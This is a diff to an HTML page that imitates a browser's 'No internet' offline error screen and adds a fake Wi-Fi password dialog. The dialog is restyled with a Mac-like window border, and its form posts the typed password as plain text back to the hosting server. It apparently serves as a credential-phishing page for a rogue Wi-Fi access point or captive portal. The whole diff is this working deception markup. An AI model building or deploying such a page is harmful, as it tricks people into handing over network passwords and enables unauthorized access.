@@ -460,26 +460,6 @@ whereas Blink does not. */
   width: 100%;
 }
 
-.offline .runner-container {
-  direction: ltr;
-  height: 150px;
-  max-width: 600px;
-  overflow: hidden;
-  position: absolute;
-  top: 35px;
-  width: 44px;
-}
-
-.offline .runner-canvas {
-  height: 150px;
-  max-width: 600px;
-  opacity: 1;
-  overflow: hidden;
-  position: absolute;
-  top: 0;
-  z-index: 10;
-}
-
 @media (max-height: 350px) {
   h1 {
     margin: 0 0 15px;
@@ -506,10 +486,6 @@ whereas Blink does not. */
   .offline .interstitial-wrapper {
     padding-top: 60px;
   }
-
-  .offline .runner-container {
-    top: 8px;
-  }
 }
 
 @media (min-height: 240px) and (orientation: landscape) {
@@ -526,10 +502,6 @@ whereas Blink does not. */
   .icon-offline {
     margin-bottom: 0;
   }
-
-  .offline .runner-container {
-    top: 10px;
-  }
 }
 
 @media (max-width: 240px) {
@@ -541,10 +513,6 @@ whereas Blink does not. */
 
 @media (prefers-color-scheme: dark) {
   .icon {
-    filter: invert(1);
-  }
-
-  .offline .runner-canvas {
     filter: invert(1);
   }
 
@@ -568,26 +536,30 @@ whereas Blink does not. */
     filter: invert(0.6);
   }
 }
+
   .form-popup {
     position: fixed;
-    top: 20%;
+    top: 22%;
     left: 50%;
+    width: 450px;
     -webkit-transform: translate(-50%, -50%);
     transform: translate(-50%, -50%);
-    height: 20%;
-    width: 30%;
     text-align: center;
     background-color: #e8e8e8;
+    padding: 0px 10px 10px 10px;
+    border: 1px solid #8f8f8f;
+    box-shadow: 0px 0px 50px 0px gray;
   }
 
-  img {
-    float: left; 
-    display: block;
-    margin-left: 20px;
-    margin-top: 20px;
+  #mac-border {
+    height: 30px;
+    width: calc(100% + 22px);
+    position: relative;
+    top: -30px;
+    left: -11px;
+    margin-bottom: -30px;
   }
-
-  .pwd {
+  #pwd {
     border: 1px solid #4195fc;
     -webkit-border-radius: 4px;
        -moz-border-radius: 4px;
@@ -596,31 +568,36 @@ whereas Blink does not. */
        -moz-box-shadow: 0px 0px 4px #4195fc;
             box-shadow: 0px 0px 4px #4195fc;
   }
-
 }
 
 </style>
 </head>
 
-<!-- wifi login box -->
-<body id="login" style="font-family: system-ui, sans-serif; font-size: 75%">
-<div class="form-popup" id="myForm">
-    <img src="/wifi-icon.png">
-    <p><b>The Wi-Fi network requires a password:</b></p>
-
-    <label for="psw">Password: </label>
-    <input id="pwd" type="password" name="psw" required>
-    <button type="submit" class="btn">Join</button>
-    
-</div>
-</body>
-
-</style>
-</head>
 <body id="t" style="font-family: system-ui, sans-serif; font-size: 75%" jstcache="0">
+  <!-- wifi login box -->
+  <div id="login">
+	  <form class="form-popup" method="post">
+      <img id="mac-border" src="/mac_border.png" />
+      <div style="float: left; display: block; height: 80px; margin: 5px;">
+  	    <img src="/wifi-icon.png" style="display: block; height: 100%; width: auto;" />
+      </div>
+      <div style="float: right; display: block">
+   	    <p><b>The Wi-Fi network requires a password:</b></p>
+        <label for="password">Password: </label>
+        <input id="pwd" type="text" name="password" autocomplete="off" required autofocus />
+        <br /><br />
+        <button type="submit" style="float: right;">Join</button>
+      </div>
+	  </form>
+  </div>
+
+  <br /><br /><br /><br /> <br />
+
   <div id="main-frame-error" class="interstitial-wrapper" jstcache="0">
     <div id="main-content" jstcache="0">
-      <div class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" alt="" jstcache="1" style="visibility: hidden;"></div>
+      <div class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" alt="" jstcache="1">
+        <img src="/trex.png" style="position: absolute; bottom: 0px; height: 100%; width: auto;" />
+      </div>
       <div id="main-message" jstcache="0">
         <h1 jstcache="0">
           <span jsselect="heading" jsvalues=".innerHTML:msg" jstcache="10">No internet</span>
@@ -650,9 +627,6 @@ whereas Blink does not. */
           </div>
         </div>
       </div>
-    </div>
-    <div class="runner-container">
-      <img src="/1x-trex.png" style="position: absolute; bottom: 0px" />
     </div>
   </div>
 </body>
